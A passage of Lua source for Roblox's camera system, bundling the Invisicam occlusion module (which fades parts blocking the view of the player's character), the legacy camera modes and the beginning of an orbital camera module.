		CIRCLE1 = 5, 		-- Circle of casts around character
		CIRCLE2 = 6, 		-- Circle of casts around character, camera relative
		LIMBMOVE = 7, 		-- LIMBS mode + MOVEMENT mode
		SMART_CIRCLE = 8, 	-- More sample points on and around character
		CHAR_OUTLINE = 9,	-- Dynamic outline around the character
	}
	
	local LIMB_TRACKING_SET = {
		-- Body parts common to R15 and R6
		['Head'] = true,
	
		-- Body parts unique to R6
		['Left Arm'] = true,
		['Right Arm'] = true,
		['Left Leg'] = true,
		['Right Leg'] = true,
	
		-- Body parts unique to R15
		['LeftLowerArm'] = true,
		['RightLowerArm'] = true,
		['LeftUpperLeg'] = true,
		['RightUpperLeg'] = true
	}
	
	local CORNER_FACTORS = {
		Vector3.new(1,1,-1),
		Vector3.new(1,-1,-1),
		Vector3.new(-1,-1,-1),
		Vector3.new(-1,1,-1)
	}
	
	local CIRCLE_CASTS = 10
	local MOVE_CASTS = 3
	local SMART_CIRCLE_CASTS = 24
	local SMART_CIRCLE_INCREMENT = 2.0 * math.pi / SMART_CIRCLE_CASTS
	local CHAR_OUTLINE_CASTS = 24
	
	-- Used to sanitize user-supplied functions
	local function AssertTypes(param, ...)
		local allowedTypes = {}
		local typeString = ''
		for _, typeName in pairs({...}) do
			allowedTypes[typeName] = true
			typeString = typeString .. (typeString == '' and '' or ' or ') .. typeName
		end
		local theType = type(param)
		assert(allowedTypes[theType], typeString .. " type expected, got: " .. theType)
	end
	
	-- Helper function for Determinant of 3x3, not in CameraUtils for performance reasons
	local function Det3x3(a,b,c,d,e,f,g,h,i)
		return (a*(e*i-f*h)-b*(d*i-f*g)+c*(d*h-e*g))
	end
	
	-- Smart Circle mode needs the intersection of 2 rays that are known to be in the same plane
	-- because they are generated from cross products with a common vector. This function is computing
	-- that intersection, but it's actually the general solution for the point halfway between where
	-- two skew lines come nearest to each other, which is more forgiving.
	local function RayIntersection(p0, v0, p1, v1)
		local v2 = v0:Cross(v1)
		local d1 = p1.x - p0.x
		local d2 = p1.y - p0.y
		local d3 = p1.z - p0.z
		local denom = Det3x3(v0.x,-v1.x,v2.x,v0.y,-v1.y,v2.y,v0.z,-v1.z,v2.z)
	
		if (denom == 0) then
			return ZERO_VECTOR3 -- No solution (rays are parallel)
		end
	
		local t0 = Det3x3(d1,-v1.x,v2.x,d2,-v1.y,v2.y,d3,-v1.z,v2.z) / denom
		local t1 = Det3x3(v0.x,d1,v2.x,v0.y,d2,v2.y,v0.z,d3,v2.z) / denom
		local s0 = p0 + t0 * v0
		local s1 = p1 + t1 * v1
		local s = s0 + 0.5 * ( s1 - s0 )
	
		-- 0.25 studs is a threshold for deciding if the rays are
		-- close enough to be considered intersecting, found through testing 
		if (s1-s0).Magnitude < 0.25 then
			return s
		else
			return ZERO_VECTOR3
		end
	end
	
	
	
	--[[ The Module ]]--
	local BaseOcclusion = _BaseOcclusion()
	local Invisicam = setmetatable({}, BaseOcclusion)
	Invisicam.__index = Invisicam
	
	function Invisicam.new()
		local self = setmetatable(BaseOcclusion.new(), Invisicam)
	
		self.char = nil
		self.humanoidRootPart = nil
		self.torsoPart = nil
		self.headPart = nil
	
		self.childAddedConn = nil
		self.childRemovedConn = nil
	
		self.behaviors = {} 	-- Map of modes to behavior fns
		self.behaviors[MODE.LIMBS] = self.LimbBehavior
		self.behaviors[MODE.MOVEMENT] = self.MoveBehavior
		self.behaviors[MODE.CORNERS] = self.CornerBehavior
		self.behaviors[MODE.CIRCLE1] = self.CircleBehavior
		self.behaviors[MODE.CIRCLE2] = self.CircleBehavior
		self.behaviors[MODE.LIMBMOVE] = self.LimbMoveBehavior
		self.behaviors[MODE.SMART_CIRCLE] = self.SmartCircleBehavior
		self.behaviors[MODE.CHAR_OUTLINE] = self.CharacterOutlineBehavior
	
		self.mode = MODE.SMART_CIRCLE
		self.behaviorFunction = self.SmartCircleBehavior
	
		self.savedHits = {} 	-- Objects currently being faded in/out
		self.trackedLimbs = {}	-- Used in limb-tracking casting modes
	
		self.camera = game.Workspace.CurrentCamera
	
		self.enabled = false
		return self
	end
	
	function Invisicam:Enable(enable)
		self.enabled = enable
	
		if not enable then
			self:Cleanup()
		end
	end
	
	function Invisicam:GetOcclusionMode()
		return Enum.DevCameraOcclusionMode.Invisicam
	end
	
	--[[ Module functions ]]--
	function Invisicam:LimbBehavior(castPoints)
		for limb, _ in pairs(self.trackedLimbs) do
			castPoints[#castPoints + 1] = limb.Position
		end
	end
	
	function Invisicam:MoveBehavior(castPoints)
		for i = 1, MOVE_CASTS do
			local position, velocity = self.humanoidRootPart.Position, self.humanoidRootPart.Velocity
			local horizontalSpeed = Vector3.new(velocity.X, 0, velocity.Z).Magnitude / 2
			local offsetVector = (i - 1) * self.humanoidRootPart.CFrame.lookVector * horizontalSpeed
			castPoints[#castPoints + 1] = position + offsetVector
		end
	end
	
	function Invisicam:CornerBehavior(castPoints)
		local cframe = self.humanoidRootPart.CFrame
		local centerPoint = cframe.p
		local rotation = cframe - centerPoint
		local halfSize = self.char:GetExtentsSize() / 2 --NOTE: Doesn't update w/ limb animations
		castPoints[#castPoints + 1] = centerPoint
		for i = 1, #CORNER_FACTORS do
			castPoints[#castPoints + 1] = centerPoint + (rotation * (halfSize * CORNER_FACTORS[i]))
		end
	end
	
	function Invisicam:CircleBehavior(castPoints)
		local cframe
		if self.mode == MODE.CIRCLE1 then
			cframe = self.humanoidRootPart.CFrame
		else
			local camCFrame = self.camera.CoordinateFrame
			cframe = camCFrame - camCFrame.p + self.humanoidRootPart.Position
		end
		castPoints[#castPoints + 1] = cframe.p
		for i = 0, CIRCLE_CASTS - 1 do
			local angle = (2 * math.pi / CIRCLE_CASTS) * i
			local offset = 3 * Vector3.new(math.cos(angle), math.sin(angle), 0)
			castPoints[#castPoints + 1] = cframe * offset
		end
	end
	
	function Invisicam:LimbMoveBehavior(castPoints)
		self:LimbBehavior(castPoints)
		self:MoveBehavior(castPoints)
	end
	
	function Invisicam:CharacterOutlineBehavior(castPoints)
		local torsoUp = self.torsoPart.CFrame.upVector.unit
		local torsoRight = self.torsoPart.CFrame.rightVector.unit
	
		-- Torso cross of points for interior coverage
		castPoints[#castPoints + 1] = self.torsoPart.CFrame.p
		castPoints[#castPoints + 1] = self.torsoPart.CFrame.p + torsoUp
		castPoints[#castPoints + 1] = self.torsoPart.CFrame.p - torsoUp
		castPoints[#castPoints + 1] = self.torsoPart.CFrame.p + torsoRight
		castPoints[#castPoints + 1] = self.torsoPart.CFrame.p - torsoRight
		if self.headPart then
			castPoints[#castPoints + 1] = self.headPart.CFrame.p
		end
	
		local cframe = CFrame.new(ZERO_VECTOR3,Vector3.new(self.camera.CoordinateFrame.lookVector.X,0,self.camera.CoordinateFrame.lookVector.Z))
		local centerPoint = (self.torsoPart and self.torsoPart.Position or self.humanoidRootPart.Position)
	
		local partsWhitelist = {self.torsoPart}
		if self.headPart then
			partsWhitelist[#partsWhitelist + 1] = self.headPart
		end
	
		for i = 1, CHAR_OUTLINE_CASTS do
			local angle = (2 * math.pi * i / CHAR_OUTLINE_CASTS)
			local offset = cframe * (3 * Vector3.new(math.cos(angle), math.sin(angle), 0))
	
			offset = Vector3.new(offset.X, math.max(offset.Y, -2.25), offset.Z)	
	
			local ray = Ray.new(centerPoint + offset, -3 * offset)
			local hit, hitPoint = game.Workspace:FindPartOnRayWithWhitelist(ray, partsWhitelist, false, false)
	
			if hit then
				-- Use hit point as the cast point, but nudge it slightly inside the character so that bumping up against
				-- walls is less likely to cause a transparency glitch
				castPoints[#castPoints + 1] = hitPoint + 0.2 * (centerPoint - hitPoint).unit
			end
		end
	end
	
	function Invisicam:SmartCircleBehavior(castPoints)
		local torsoUp = self.torsoPart.CFrame.upVector.unit
		local torsoRight = self.torsoPart.CFrame.rightVector.unit
	
		-- SMART_CIRCLE mode includes rays to head and 5 to the torso.
		-- Hands, arms, legs and feet are not included since they
		-- are not canCollide and can therefore go inside of parts
		castPoints[#castPoints + 1] = self.torsoPart.CFrame.p
		castPoints[#castPoints + 1] = self.torsoPart.CFrame.p + torsoUp
		castPoints[#castPoints + 1] = self.torsoPart.CFrame.p - torsoUp
		castPoints[#castPoints + 1] = self.torsoPart.CFrame.p + torsoRight
		castPoints[#castPoints + 1] = self.torsoPart.CFrame.p - torsoRight
		if self.headPart then
			castPoints[#castPoints + 1] = self.headPart.CFrame.p
		end
	
		local cameraOrientation = self.camera.CFrame - self.camera.CFrame.p
		local torsoPoint = Vector3.new(0,0.5,0) + (self.torsoPart and self.torsoPart.Position or self.humanoidRootPart.Position)
		local radius = 2.5
	
		-- This loop first calculates points in a circle of radius 2.5 around the torso of the character, in the
		-- plane orthogonal to the camera's lookVector. Each point is then raycast to, to determine if it is within
		-- the free space surrounding the player (not inside anything). Two iterations are done to adjust points that
		-- are inside parts, to try to move them to valid locations that are still on their camera ray, so that the
		-- circle remains circular from the camera's perspective, but does not cast rays into walls or parts that are
		-- behind, below or beside the character and not really obstructing view of the character. This minimizes
		-- the undesirable situation where the character walks up to an exterior wall and it is made invisible even
		-- though it is behind the character.
		for i = 1, SMART_CIRCLE_CASTS do
			local angle = SMART_CIRCLE_INCREMENT * i - 0.5 * math.pi
			local offset = radius * Vector3.new(math.cos(angle), math.sin(angle), 0)
			local circlePoint = torsoPoint + cameraOrientation * offset
	
			-- Vector from camera to point on the circle being tested
			local vp = circlePoint - self.camera.CFrame.p
	
			local ray = Ray.new(torsoPoint, circlePoint - torsoPoint)
			local hit, hp, hitNormal = game.Workspace:FindPartOnRayWithIgnoreList(ray, {self.char}, false, false )
			local castPoint = circlePoint
	
			if hit then
				local hprime = hp + 0.1 * hitNormal.unit -- Slightly offset hit point from the hit surface
				local v0 = hprime - torsoPoint -- Vector from torso to offset hit point
	
				local perp = (v0:Cross(vp)).unit
	
				-- Vector from the offset hit point, along the hit surface
				local v1 = (perp:Cross(hitNormal)).unit
	
				-- Vector from camera to offset hit
				local vprime = (hprime - self.camera.CFrame.p).unit
	
				-- This dot product checks to see if the vector along the hit surface would hit the correct
				-- side of the invisicam cone, or if it would cross the camera look vector and hit the wrong side
				if ( v0.unit:Dot(-v1) < v0.unit:Dot(vprime)) then
					castPoint = RayIntersection(hprime, v1, circlePoint, vp)
	
					if castPoint.Magnitude > 0 then
						local ray = Ray.new(hprime, castPoint - hprime)
						local hit, hitPoint, hitNormal = game.Workspace:FindPartOnRayWithIgnoreList(ray, {self.char}, false, false )
	
						if hit then
							local hprime2 = hitPoint + 0.1 * hitNormal.unit
							castPoint = hprime2
						end
					else
						castPoint = hprime
					end
				else
					castPoint = hprime
				end
	
				local ray = Ray.new(torsoPoint, (castPoint - torsoPoint))
				local hit, hitPoint, hitNormal = game.Workspace:FindPartOnRayWithIgnoreList(ray, {self.char}, false, false )
	
				if hit then
					local castPoint2 = hitPoint - 0.1 * (castPoint - torsoPoint).unit
					castPoint = castPoint2
				end
			end
	
			castPoints[#castPoints + 1] = castPoint
		end
	end
	
	function Invisicam:CheckTorsoReference()
		if self.char then
			self.torsoPart = self.char:FindFirstChild("Torso")
			if not self.torsoPart then
				self.torsoPart = self.char:FindFirstChild("UpperTorso")
				if not self.torsoPart then
					self.torsoPart = self.char:FindFirstChild("HumanoidRootPart")
				end
			end
	
			self.headPart = self.char:FindFirstChild("Head")
		end
	end
	
	function Invisicam:CharacterAdded(char, player)
		-- We only want the LocalPlayer's character
		if player~=PlayersService.LocalPlayer then return end
	
		if self.childAddedConn then
			self.childAddedConn:Disconnect()
			self.childAddedConn = nil
		end
		if self.childRemovedConn then
			self.childRemovedConn:Disconnect()
			self.childRemovedConn = nil
		end
	
		self.char = char
	
		self.trackedLimbs = {}
		local function childAdded(child)
			if child:IsA("BasePart") then
				if LIMB_TRACKING_SET[child.Name] then
					self.trackedLimbs[child] = true
				end
	
				if child.Name == "Torso" or child.Name == "UpperTorso" then
					self.torsoPart = child
				end
	
				if child.Name == "Head" then
					self.headPart = child
				end
			end
		end
	
		local function childRemoved(child)
			self.trackedLimbs[child] = nil
	
			-- If removed/replaced part is 'Torso' or 'UpperTorso' double check that we still have a TorsoPart to use
			self:CheckTorsoReference()
		end
	
		self.childAddedConn = char.ChildAdded:Connect(childAdded)
		self.childRemovedConn = char.ChildRemoved:Connect(childRemoved)
		for _, child in pairs(self.char:GetChildren()) do
			childAdded(child)
		end
	end
	
	function Invisicam:SetMode(newMode)
		AssertTypes(newMode, 'number')
		for _, modeNum in pairs(MODE) do
			if modeNum == newMode then
				self.mode = newMode
				self.behaviorFunction = self.behaviors[self.mode]
				return
			end
		end
		error("Invalid mode number")
	end
	
	function Invisicam:GetObscuredParts()
		return self.savedHits
	end
	
	-- Want to turn off Invisicam? Be sure to call this after.
	function Invisicam:Cleanup()
		for hit, originalFade in pairs(self.savedHits) do
			hit.LocalTransparencyModifier = originalFade
		end
	end
	
	function Invisicam:Update(dt, desiredCameraCFrame, desiredCameraFocus)
		-- Bail if there is no Character
		if not self.enabled or not self.char then
			return desiredCameraCFrame, desiredCameraFocus
		end
	
		self.camera = game.Workspace.CurrentCamera
	
		-- TODO: Move this to a GetHumanoidRootPart helper, probably combine with CheckTorsoReference
		-- Make sure we still have a HumanoidRootPart
		if not self.humanoidRootPart then
			local humanoid = self.char:FindFirstChildOfClass("Humanoid")
			if humanoid and humanoid.RootPart then
				self.humanoidRootPart = humanoid.RootPart
			else
				-- Not set up with Humanoid? Try and see if there's one in the Character at all:
				self.humanoidRootPart = self.char:FindFirstChild("HumanoidRootPart")
				if not self.humanoidRootPart then
					-- Bail out, since we're relying on HumanoidRootPart existing
					return desiredCameraCFrame, desiredCameraFocus
				end
			end
	
			-- TODO: Replace this with something more sensible
			local ancestryChangedConn
			ancestryChangedConn = self.humanoidRootPart.AncestryChanged:Connect(function(child, parent)
				if child == self.humanoidRootPart and not parent then 
					self.humanoidRootPart = nil
					if ancestryChangedConn and ancestryChangedConn.Connected then
						ancestryChangedConn:Disconnect()
						ancestryChangedConn = nil
					end
				end
			end)
		end
	
		if not self.torsoPart then
			self:CheckTorsoReference()
			if not self.torsoPart then
				-- Bail out, since we're relying on Torso existing, should never happen since we fall back to using HumanoidRootPart as torso
				return desiredCameraCFrame, desiredCameraFocus
			end
		end
	
		-- Make a list of world points to raycast to
		local castPoints = {}
		self.behaviorFunction(self, castPoints)
	
		-- Cast to get a list of objects between the camera and the cast points
		local currentHits = {}
		local ignoreList = {self.char}
		local function add(hit)
			currentHits[hit] = true
			if not self.savedHits[hit] then
				self.savedHits[hit] = hit.LocalTransparencyModifier
			end
		end
	
		local hitParts
		local hitPartCount = 0
	
		-- Hash table to treat head-ray-hit parts differently than the rest of the hit parts hit by other rays
		-- head/torso ray hit parts will be more transparent than peripheral parts when USE_STACKING_TRANSPARENCY is enabled
		local headTorsoRayHitParts = {}
	
		local perPartTransparencyHeadTorsoHits = TARGET_TRANSPARENCY
		local perPartTransparencyOtherHits = TARGET_TRANSPARENCY
	
		if USE_STACKING_TRANSPARENCY then
	
			-- This first call uses head and torso rays to find out how many parts are stacked up
			-- for the purpose of calculating required per-part transparency
			local headPoint = self.headPart and self.headPart.CFrame.p or castPoints[1]
			local torsoPoint = self.torsoPart and self.torsoPart.CFrame.p or castPoints[2]
			hitParts = self.camera:GetPartsObscuringTarget({headPoint, torsoPoint}, ignoreList)
	
			-- Count how many things the sample rays passed through, including decals. This should only
			-- count decals facing the camera, but GetPartsObscuringTarget does not return surface normals,
			-- so my compromise for now is to just let any decal increase the part count by 1. Only one
			-- decal per part will be considered.
			for i = 1, #hitParts do
				local hitPart = hitParts[i]
				hitPartCount = hitPartCount + 1 -- count the part itself
				headTorsoRayHitParts[hitPart] = true
				for _, child in pairs(hitPart:GetChildren()) do
					if child:IsA('Decal') or child:IsA('Texture') then
						hitPartCount = hitPartCount + 1 -- count first decal hit, then break
						break
					end
				end
			end
	
			if (hitPartCount > 0) then
				perPartTransparencyHeadTorsoHits = math.pow( ((0.5 * TARGET_TRANSPARENCY) + (0.5 * TARGET_TRANSPARENCY / hitPartCount)), 1 / hitPartCount )
				perPartTransparencyOtherHits = math.pow( ((0.5 * TARGET_TRANSPARENCY_PERIPHERAL) + (0.5 * TARGET_TRANSPARENCY_PERIPHERAL / hitPartCount)), 1 / hitPartCount )
			end
		end
	
		-- Now get all the parts hit by all the rays
		hitParts = self.camera:GetPartsObscuringTarget(castPoints, ignoreList)
	
		local partTargetTransparency = {}
	
		-- Include decals and textures
		for i = 1, #hitParts do
			local hitPart = hitParts[i]
	
			partTargetTransparency[hitPart] =headTorsoRayHitParts[hitPart] and perPartTransparencyHeadTorsoHits or perPartTransparencyOtherHits
	
			-- If the part is not already as transparent or more transparent than what invisicam requires, add it to the list of
			-- parts to be modified by invisicam
			if hitPart.Transparency < partTargetTransparency[hitPart] then
				add(hitPart)
			end
	
			-- Check all decals and textures on the part
			for _, child in pairs(hitPart:GetChildren()) do
				if child:IsA('Decal') or child:IsA('Texture') then
					if (child.Transparency < partTargetTransparency[hitPart]) then
						partTargetTransparency[child] = partTargetTransparency[hitPart]
						add(child)
					end
				end
			end
		end
	
		-- Invisibilize objects that are in the way, restore those that aren't anymore
		for hitPart, originalLTM in pairs(self.savedHits) do
			if currentHits[hitPart] then
				-- LocalTransparencyModifier gets whatever value is required to print the part's total transparency to equal perPartTransparency
				hitPart.LocalTransparencyModifier = (hitPart.Transparency < 1) and ((partTargetTransparency[hitPart] - hitPart.Transparency) / (1.0 - hitPart.Transparency)) or 0
			else -- Restore original pre-invisicam value of LTM
				hitPart.LocalTransparencyModifier = originalLTM
				self.savedHits[hitPart] = nil
			end
		end
	
		-- Invisicam does not change the camera values
		return desiredCameraCFrame, desiredCameraFocus
	end
	
	return Invisicam
end

function _LegacyCamera()
	
	local ZERO_VECTOR2 = Vector2.new(0,0)
	
	local Util = _CameraUtils()
	
	--[[ Services ]]--
	local PlayersService = game:GetService('Players')
	
	--[[ The Module ]]--
	local BaseCamera = _BaseCamera()
	local LegacyCamera = setmetatable({}, BaseCamera)
	LegacyCamera.__index = LegacyCamera
	
	function LegacyCamera.new()
		local self = setmetatable(BaseCamera.new(), LegacyCamera)
	
		self.cameraType = Enum.CameraType.Fixed
		self.lastUpdate = tick()
		self.lastDistanceToSubject = nil
	
		return self
	end
	
	function LegacyCamera:GetModuleName()
		return "LegacyCamera"
	end
	
	--[[ Functions overridden from BaseCamera ]]--
	function LegacyCamera:SetCameraToSubjectDistance(desiredSubjectDistance)
		return BaseCamera.SetCameraToSubjectDistance(self,desiredSubjectDistance)
	end
	
	function LegacyCamera:Update(dt)
	
		-- Cannot update until cameraType has been set
		if not self.cameraType then return end
	
		local now = tick()
		local timeDelta = (now - self.lastUpdate)
		local camera = 	workspace.CurrentCamera
		local newCameraCFrame = camera.CFrame
		local newCameraFocus = camera.Focus
		local player = PlayersService.LocalPlayer
	
		if self.lastUpdate == nil or timeDelta > 1 then
			self.lastDistanceToSubject = nil
		end
		local subjectPosition = self:GetSubjectPosition()
	
		if self.cameraType == Enum.CameraType.Fixed then
			if self.lastUpdate then
				-- Cap out the delta to 0.1 so we don't get some crazy things when we re-resume from
				local delta = math.min(0.1, now - self.lastUpdate)
				local gamepadRotation = self:UpdateGamepad()
				self.rotateInput = self.rotateInput + (gamepadRotation * delta)
			end
	
			if subjectPosition and player and camera then
				local distanceToSubject = self:GetCameraToSubjectDistance()
				local newLookVector = self:CalculateNewLookVector()
				self.rotateInput = ZERO_VECTOR2
	
				newCameraFocus = camera.Focus -- Fixed camera does not change focus
				newCameraCFrame = CFrame.new(camera.CFrame.p, camera.CFrame.p + (distanceToSubject * newLookVector))
			end
		elseif self.cameraType == Enum.CameraType.Attach then
			if subjectPosition and camera then
				local distanceToSubject = self:GetCameraToSubjectDistance()
				local humanoid = self:GetHumanoid()
				if self.lastUpdate and humanoid and humanoid.RootPart then
	
					-- Cap out the delta to 0.1 so we don't get some crazy things when we re-resume from
					local delta = math.min(0.1, now - self.lastUpdate)
					local gamepadRotation = self:UpdateGamepad()
					self.rotateInput = self.rotateInput + (gamepadRotation * delta)
	
					local forwardVector = humanoid.RootPart.CFrame.lookVector
	
					local y = Util.GetAngleBetweenXZVectors(forwardVector, self:GetCameraLookVector())
					if Util.IsFinite(y) then
						-- Preserve vertical rotation from user input
						self.rotateInput = Vector2.new(y, self.rotateInput.Y)
					end
				end
	
				local newLookVector = self:CalculateNewLookVector()
				self.rotateInput = ZERO_VECTOR2
	
				newCameraFocus = CFrame.new(subjectPosition)
				newCameraCFrame = CFrame.new(subjectPosition - (distanceToSubject * newLookVector), subjectPosition)
			end
		elseif self.cameraType == Enum.CameraType.Watch then
			if subjectPosition and player and camera then
				local cameraLook = nil
	
				local humanoid = self:GetHumanoid()
				if humanoid and humanoid.RootPart then
					local diffVector = subjectPosition - camera.CFrame.p
					cameraLook = diffVector.unit
	
					if self.lastDistanceToSubject and self.lastDistanceToSubject == self:GetCameraToSubjectDistance() then
						-- Don't clobber the zoom if they zoomed the camera
						local newDistanceToSubject = diffVector.magnitude
						self:SetCameraToSubjectDistance(newDistanceToSubject)
					end
				end
	
				local distanceToSubject = self:GetCameraToSubjectDistance()
				local newLookVector = self:CalculateNewLookVector(cameraLook)
				self.rotateInput = ZERO_VECTOR2
	
				newCameraFocus = CFrame.new(subjectPosition)
				newCameraCFrame = CFrame.new(subjectPosition - (distanceToSubject * newLookVector), subjectPosition)
	
				self.lastDistanceToSubject = distanceToSubject
			end
		else
			-- Unsupported type, return current values unchanged
			return camera.CFrame, camera.Focus
		end
	
		self.lastUpdate = now
		return newCameraCFrame, newCameraFocus
	end
	
	return LegacyCamera
end

function _OrbitalCamera()
	
	-- Local private variables and constants
	local UNIT_Z = Vector3.new(0,0,1)
	local X1_Y0_Z1 = Vector3.new(1,0,1)	--Note: not a unit vector, used for projecting onto XZ plane
	local ZERO_VECTOR3 = Vector3.new(0,0,0)
	local ZERO_VECTOR2 = Vector2.new(0,0)
	local TAU = 2 * math.pi
	
	--[[ Gamepad Support ]]--
	local THUMBSTICK_DEADZONE = 0.2
	
	-- Do not edit these values, they are not the developer-set limits, they are limits
	-- to the values the camera system equations can correctly handle
	local MIN_ALLOWED_ELEVATION_DEG = -80
	local MAX_ALLOWED_ELEVATION_DEG = 80
	
	local externalProperties = {}
	externalProperties["InitialDistance"]  = 25
	externalProperties["MinDistance"]      = 10
	externalProperties["MaxDistance"]      = 100
	externalProperties["InitialElevation"] = 35
	externalProperties["MinElevation"]     = 35
	externalProperties["MaxElevation"]     = 35
	externalProperties["ReferenceAzimuth"] = -45	-- Angle around the Y axis where the camera starts. -45 offsets the camera in the -X and +Z directions equally
	externalProperties["CWAzimuthTravel"]  = 90	-- How many degrees the camera is allowed to rotate from the reference position, CW as seen from above
	externalProperties["CCWAzimuthTravel"] = 90	-- How many degrees the camera is allowed to rotate from the reference position, CCW as seen from above
	externalProperties["UseAzimuthLimits"] = false -- Full rotation around Y axis available by default
	
	local Util = _CameraUtils()
	
	--[[ Services ]]--
	local PlayersService = game:GetService('Players')
	local VRService = game:GetService("VRService")
	
	--[[ The Module ]]--
	local BaseCamera = _BaseCamera()
	local OrbitalCamera = setmetatable({}, BaseCamera)
	OrbitalCamera.__index = OrbitalCamera
	
	
	function OrbitalCamera.new()
		local self = setmetatable(BaseCamera.new(), OrbitalCamera)
	
		self.lastUpdate = tick()
	
		-- OrbitalCamera-specific members
		self.changedSignalConnections = {}
		self.refAzimuthRad = nil
		self.curAzimuthRad = nil
		self.minAzimuthAbsoluteRad = nil
		self.maxAzimuthAbsoluteRad = nil
		self.useAzimuthLimits = nil
		self.curElevationRad = nil
		self.minElevationRad = nil
		self.maxElevationRad = nil
		self.curDistance = nil
		self.minDistance = nil
		self.maxDistance = nil
	
		-- Gamepad
		self.r3ButtonDown = false
		self.l3ButtonDown = false
		self.gamepadDollySpeedMultiplier = 1
	
		self.lastUserPanCamera = tick()
	
		self.externalProperties = {}
		self.externalProperties["InitialDistance"] 	= 25
		self.externalProperties["MinDistance"] 		= 10
		self.externalProperties["MaxDistance"] 		= 100
		self.externalProperties["InitialElevation"] 	= 35
		self.externalProperties["MinElevation"] 		= 35
		self.externalProperties["MaxElevation"] 		= 35
		self.externalProperties["ReferenceAzimuth"] 	= -45	-- Angle around the Y axis where the camera starts. -45 offsets the camera in the -X and +Z directions equally
		self.externalProperties["CWAzimuthTravel"] 	= 90	-- How many degrees the camera is allowed to rotate from the reference position, CW as seen from above
		self.externalProperties["CCWAzimuthTravel"] 	= 90	-- How many degrees the camera is allowed to rotate from the reference position, CCW as seen from above
		self.externalProperties["UseAzimuthLimits"] 	= false -- Full rotation around Y axis available by default
		self:LoadNumberValueParameters()
	
		return self
	end
	
	function OrbitalCamera:LoadOrCreateNumberValueParameter(name, valueType, updateFunction)
		local valueObj = script:FindFirstChild(name)
	
		if valueObj and valueObj:isA(valueType) then
			-- Value object exists and is the correct type, use its value
			self.externalProperties[name] = valueObj.Value
		elseif self.externalProperties[name] ~= nil then
			-- Create missing (or replace incorrectly-typed) valueObject with default value
			valueObj = Instance.new(valueType)
			valueObj.Name = name
			valueObj.Parent = script
			valueObj.Value = self.externalProperties[name]
		else
			print("externalProperties table has no entry for ",name)
			return
		end
	
		if updateFunction then
			if self.changedSignalConnections[name] then
				self.changedSignalConnections[name]:Disconnect()
			end
			self.changedSignalConnections[name] = valueObj.Changed:Connect(function(newValue)
				self.externalProperties[name] = newValue
				updateFunction(self)
			end)
		end
	end
	
	function OrbitalCamera:SetAndBoundsCheckAzimuthValues()
		self.minAzimuthAbsoluteRad = math.rad(self.externalProperties["ReferenceAzimuth"]) - math.abs(math.rad(self.externalProperties["CWAzimuthTravel"]))
		self.maxAzimuthAbsoluteRad = math.rad(self.externalProperties["ReferenceAzimuth"]) + math.abs(math.rad(self.externalProperties["CCWAzimuthTravel"]))
		self.useAzimuthLimits = self.externalProperties["UseAzimuthLimits"]
		if self.useAzimuthLimits then
			self.curAzimuthRad = math.max(self.curAzimuthRad, self.minAzimuthAbsoluteRad)
			self.curAzimuthRad = math.min(self.curAzimuthRad, self.maxAzimuthAbsoluteRad)
		end
	end
	
	function OrbitalCamera:SetAndBoundsCheckElevationValues()
		-- These degree values are the direct user input values. It is deliberate that they are
		-- ranged checked only against the extremes, and not against each other. Any time one
		-- is changed, both of the internal values in radians are recalculated. This allows for
		-- A developer to change the values in any order and for the end results to be that the
		-- internal values adjust to match intent as best as possible.
		local minElevationDeg = math.max(self.externalProperties["MinElevation"], MIN_ALLOWED_ELEVATION_DEG)
		local maxElevationDeg = math.min(self.externalProperties["MaxElevation"], MAX_ALLOWED_ELEVATION_DEG)
	
		-- Set internal values in radians
		self.minElevationRad = math.rad(math.min(minElevationDeg, maxElevationDeg))
		self.maxElevationRad = math.rad(math.max(minElevationDeg, maxElevationDeg))
		self.curElevationRad = math.max(self.curElevationRad, self.minElevationRad)
		self.curElevationRad = math.min(self.curElevationRad, self.maxElevationRad)
	end
	
	function OrbitalCamera:SetAndBoundsCheckDistanceValues()
		self.minDistance = self.externalProperties["MinDistance"]
		self.maxDistance = self.externalProperties["MaxDistance"]
		self.curDistance = math.max(self.curDistance, self.minDistance)
		self.curDistance = math.min(self.curDistance, self.maxDistance)
	end
	
	-- This loads from, or lazily creates, NumberValue objects for exposed parameters
	function OrbitalCamera:LoadNumberValueParameters()
		-- These initial values do not require change listeners since they are read only once
		self:LoadOrCreateNumberValueParameter("InitialElevation", "NumberValue", nil)
		self:LoadOrCreateNumberValueParameter("InitialDistance", "NumberValue", nil)
	
		-- Note: ReferenceAzimuth is also used as an initial value, but needs a change listener because it is used in the calculation of the limits
		self:LoadOrCreateNumberValueParameter("ReferenceAzimuth", "NumberValue", self.SetAndBoundsCheckAzimuthValue)
		self:LoadOrCreateNumberValueParameter("CWAzimuthTravel", "NumberValue", self.SetAndBoundsCheckAzimuthValues)
		self:LoadOrCreateNumberValueParameter("CCWAzimuthTravel", "NumberValue", self.SetAndBoundsCheckAzimuthValues)
		self:LoadOrCreateNumberValueParameter("MinElevation", "NumberValue", self.SetAndBoundsCheckElevationValues)
		self:LoadOrCreateNumberValueParameter("MaxElevation", "NumberValue", self.SetAndBoundsCheckElevationValues)
		self:LoadOrCreateNumberValueParameter("MinDistance", "NumberValue", self.SetAndBoundsCheckDistanceValues)
		self:LoadOrCreateNumberValueParameter("MaxDistance", "NumberValue", self.SetAndBoundsCheckDistanceValues)
		self:LoadOrCreateNumberValueParameter("UseAzimuthLimits", "BoolValue", self.SetAndBoundsCheckAzimuthValues)
	
		-- Internal values set (in radians, from degrees), plus sanitization
		self.curAzimuthRad = math.rad(self.externalProperties["ReferenceAzimuth"])
		self.curElevationRad = math.rad(self.externalProperties["InitialElevation"])
		self.curDistance = self.externalProperties["InitialDistance"]
	
		self:SetAndBoundsCheckAzimuthValues()
		self:SetAndBoundsCheckElevationValues()
		self:SetAndBoundsCheckDistanceValues()
	end
	
	function OrbitalCamera:GetModuleName()
		return "OrbitalCamera"
	end
	
	function OrbitalCamera:SetInitialOrientation(humanoid)
		if not humanoid or not humanoid.RootPart then
			warn("OrbitalCamera could not set initial orientation due to missing humanoid")
			return
		end
		local newDesiredLook = (humanoid.RootPart.CFrame.lookVector - Vector3.new(0,0.23,0)).unit
		local horizontalShift = Util.GetAngleBetweenXZVectors(newDesiredLook, self:GetCameraLookVector())
		local vertShift = math.asin(self:GetCameraLookVector().y) - math.asin(newDesiredLook.y)
		if not Util.IsFinite(horizontalShift) then
			horizontalShift = 0
		end
		if not Util.IsFinite(vertShift) then
			vertShift = 0
		end
		self.rotateInput = Vector2.new(horizontalShift, vertShift)
	end
	
	--[[ Functions of BaseCamera that are overridden by OrbitalCamera ]]--
	function OrbitalCamera:GetCameraToSubjectDistance()
